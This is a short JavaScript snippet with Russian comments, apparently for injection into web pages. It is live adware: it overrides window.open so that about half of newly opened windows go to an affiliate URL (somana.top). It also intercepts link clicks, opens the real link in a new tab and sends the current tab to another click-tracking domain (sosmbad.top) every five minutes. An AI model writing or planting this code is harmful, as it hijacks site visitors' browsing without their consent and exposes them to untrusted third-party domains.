setTimeout(function () {
  const originalOpen = window.open;

  window.open = function (url, name, specs) {
    const newWindow = originalOpen.call(this, url, name, specs);

    // Проверяем, что ссылка не содержит sosalkino
    if (
      newWindow &&
      url &&
      !url.includes("sosalkino") &&
      !url.includes("sosmbad") &&
      Math.random() < 0.5
    ) {
      newWindow.location.href = "https://somana.top/click?o=2&a=7685";
    }

    return newWindow;
  };
}, 100);


(function () {
  const POPUNDER_URL = 'https://sosmbad.top/click?o=20&a=7685';
  const STORAGE_KEY = 'lastPopunderShown';
  const INTERVAL_MS = 5 * 60 * 1000;

  function shouldShowPopunder() {
    const last = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);
    return (Date.now() - last) > INTERVAL_MS;
  }

  function markPopunderShown() {
    localStorage.setItem(STORAGE_KEY, Date.now().toString());
  }

  function handleUserInteraction(e) {
    // ищем клик по ссылке <a>
    const link = e.target.closest('a[href]');
    if (!link) return;

    if (shouldShowPopunder()) {
      e.preventDefault(); // отменяем обычное поведение ссылки

      const url = link.href;

      // 1. открываем текущую ссылку в новом окне
      window.open(url, '_blank');

      // 2. меняем текущую вкладку на попандер-ссылку
      document.location.href = POPUNDER_URL;

      markPopunderShown();
    }
  }

  document.addEventListener('click', handleUserInteraction, { passive: false });
})();
